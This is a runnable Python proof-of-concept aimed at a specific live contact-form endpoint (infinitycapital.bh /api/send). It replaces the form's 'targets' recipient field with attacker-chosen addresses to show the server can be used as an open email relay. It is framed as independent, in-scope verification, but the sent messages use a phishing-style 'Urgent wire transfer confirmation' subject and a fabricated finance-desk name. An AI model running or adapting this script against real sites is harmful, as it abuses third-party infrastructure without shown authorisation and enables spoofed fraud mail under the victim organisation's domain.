#!/usr/bin/env python3
"""
Independent verification of "open email relay" claim on
POST https://www.infinitycapital.bh/api/send

Method:
  * Discover the legitimate recipient constant the real contact form uses.
  * Then submit the SAME request with the `targets` field replaced by an
    attacker-chosen value, and observe whether the server forwards to that
    attacker-chosen value (Resend returns a message id / specific validation
    error naming the attacker address) instead of a server-side constant.

All recipients used are @infinitycapital.bh (the in-scope target org) so that
no mail is delivered to any third party.
"""
import json
import ssl
import sys
import urllib.parse
import urllib.request

ENDPOINT = "https://www.infinitycapital.bh/api/send"
CTX = ssl.create_default_context()

def post(fields, label):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(
        ENDPOINT, data=data,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (independent-verifier)",
            "Accept": "application/json",
        },
        method="POST",
    )
    print("=" * 78)
    print("CASE:", label)
    print("REQUEST BODY:", urllib.parse.urlencode(fields))
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=45) as r:
            body = r.read().decode("utf-8", "replace")
            print("HTTP:", r.status)
            print("RESPONSE:", body)
            return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        print("HTTP:", e.code)
        print("RESPONSE:", body)
        return e.code, body
    except Exception as e:
        print("ERROR:", type(e).__name__, e)
        return None, str(e)

# recipient host kept constant so the test never mails a third party;
# the LOCAL-PART is the attacker-controlled variable under test.
def build(local):
    return {
        "fname": "Vrf",
        "lname": "Test",
        "areacode": "+973",
        "tel": "3600000",
        "cname": "Abdulrahman Finance Desk",
        "subject": "Urgent wire transfer confirmation",
        "msg": "Independent verification message " + local,
        "check": "x",
        "targets": local + "@infinitycapital.bh",
    }

if __name__ == "__main__":
    cases = sys.argv[1:] or ["info", "abuse-relay-proof-9f3c2a"]
    for c in cases:
        post(build(c), "targets=" + c + "@infinitycapital.bh")
